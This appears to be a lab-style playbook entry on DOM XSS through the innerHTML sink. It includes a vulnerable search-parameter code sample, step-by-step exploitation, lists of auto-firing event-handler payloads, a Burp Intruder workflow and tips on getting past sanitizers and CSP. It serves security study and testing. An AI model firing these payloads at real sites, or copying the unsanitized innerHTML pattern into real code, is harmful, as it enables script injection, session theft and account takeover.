# DOM XSS — `innerHTML` Sink

## When this applies

Code assigns user-controllable data to `element.innerHTML` (or `element.outerHTML`). Unlike `document.write()`, the HTML5 spec forbids `<script>` tags inserted via `innerHTML` from executing. Exploitation requires event-handler payloads on standalone tags.

## Technique

```javascript
element.innerHTML = userInput;
```

- `<script>` tags won't execute when inserted via innerHTML
- Must use event handlers (`onerror`, `onload`, `onfocus`, etc.) on tags that fire those events

**Payloads:**
```html
<img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<iframe src=x onerror=alert(1)>
```

## Steps

### Vulnerable Code
```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

### Vulnerability Analysis
- **Source:** `location.search`
- **Sink:** `innerHTML`
- **Critical limitation:** `<script>` tags won't execute
- **Must use:** Event handlers

### Step-by-Step Solution

1. Navigate to the page and search for "test".
2. Observe URL: `/?search=test`.
3. View page source: `<div id="searchMessage">test</div>`.
4. Try `<script>alert(1)</script>` - this FAILS.
5. Use event handler: `/?search=<img src=x onerror=alert(1)>`.
6. Alert fires.

### Working Payloads

```html
<img src=1 onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<iframe src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

### Why innerHTML is Different

**Script tags don't work:**
```html
<script>alert(1)</script> ❌ Won't execute
```

**SVG onload doesn't work:**
```html
<svg onload=alert(1)> ❌ Won't execute
```

**Event handlers DO work:**
```html
<img src=x onerror=alert(1)> ✅ Executes
```

### Burp Suite Workflow

**DOM Invader Detection:**
1. DOM Invader shows `innerHTML` in sinks panel
2. Confirms no encoding/sanitization
3. Context shows it's direct innerHTML assignment
4. Craft img onerror payload

**Testing with Intruder:**
1. Send request to Intruder
2. Mark search parameter as payload position
3. Load XSS payload list (filter out script tags)
4. Start attack
5. Look for 200 responses with successful execution

## Verifying success

- The chosen event-handler payload triggers (alert fires, fetch request to attacker server).
- DevTools Elements panel shows the injected tag rendered as a real DOM element (not text).
- `document.getElementById(targetId).innerHTML` in console returns the injected HTML.

## Common pitfalls

1. **Trying `<script>` first** — wastes time. innerHTML doesn't execute scripts inserted post-load.
2. **`<svg onload>` quirk** — `<svg>` parsed via innerHTML does NOT fire `onload`. Use `<svg><animate onbegin>` or `<img onerror>` instead.
3. **Sanitizer in front** — DOMPurify is often called before innerHTML. Confirm raw input reaches the sink.
4. **Event handlers without trigger** — `onclick` requires user click; prefer auto-firing events (`onerror`, `autofocus`+`onfocus`, `ontoggle` on `<details open>`, `onbegin` on SVG animate).
5. **CSP `script-src`** — even event handlers may be blocked by `'unsafe-inline'`-restrictive CSP. Test the policy first.

## Tools

- **DOM Invader** — flags innerHTML as a sink with context
- **PortSwigger XSS cheat sheet** — list of innerHTML-compatible payloads
- **`patt-fetcher`** — fetch payloads from PayloadsAllTheThings
- **DevTools Console** — `el.innerHTML = '<img src=x onerror=alert(1)>'` to test locally
